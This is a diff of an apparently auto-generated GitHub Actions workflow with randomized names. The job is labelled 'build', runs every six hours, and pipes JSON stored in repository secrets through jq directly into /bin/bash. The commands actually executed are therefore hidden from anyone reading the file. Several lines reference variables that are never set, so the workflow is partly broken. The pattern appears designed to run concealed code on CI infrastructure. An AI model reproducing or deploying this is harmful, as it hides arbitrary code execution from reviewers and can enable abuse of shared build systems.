@@ -1,8 +1,10 @@
 name: kedaoma7564
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 4/6 * * *'
+    - cron: '37 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,21 +13,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: kedaoma7564
         env:
-          caq5: ${{ secrets.caq5 }}
+          lw1583: ${{ secrets.lw1583 }}
         run: |
-          echo $caq5 | jq -r .yma23553 | /bin/bash
-          echo $nb5 | jq -r .whaor36 | /bin/bash
-          echo $wfhq76477 | jq -r .rzdd4 | /bin/bash
-          echo $deynz8 | jq -r .zp1 | /bin/bash
-          echo $loizo318 | jq -r .dicli676 | /bin/bash
-          echo $dzpw24547 | jq -r .sfhu4373 | /bin/bash
-          echo $kqsne7054 | jq -r .ugze52107 | /bin/bash
-          echo $eqk2143 | jq -r .b1515 | /bin/bash
-          echo $mqq522 | jq -r .afxw643 | /bin/bash
-          echo $kbq14726 | jq -r .x7 | /bin/bash
-          echo $gdsei20 | jq -r .gzu74876 | /bin/bash
-          echo $invdp3 | jq -r .vb90445 | /bin/bash
-          echo $rrr2734 | jq -r .fgmoa61051 | /bin/bash
-          echo $bvr303 | jq -r .qma20 | /bin/bash
-          echo $zvm3 | jq -r .aks52293 | /bin/bash
+          echo $lw1583 | jq -r .k5 | /bin/bash
+          echo $qoz325 | jq -r .ebtru81605 | /bin/bash
+          echo $kbhxl9 | jq -r .fbdhj88647 | /bin/bash
+          echo $d792 | jq -r .s5839 | /bin/bash
+          echo $hdl70 | jq -r .q99 | /bin/bash
+          echo $iano50241 | jq -r .ueo1 | /bin/bash
+          echo $fvgy9801 | jq -r .j2 | /bin/bash
+          echo $c990 | jq -r .ahina541 | /bin/bash
+          echo $xkzc02404 | jq -r .eyl6 | /bin/bash
 
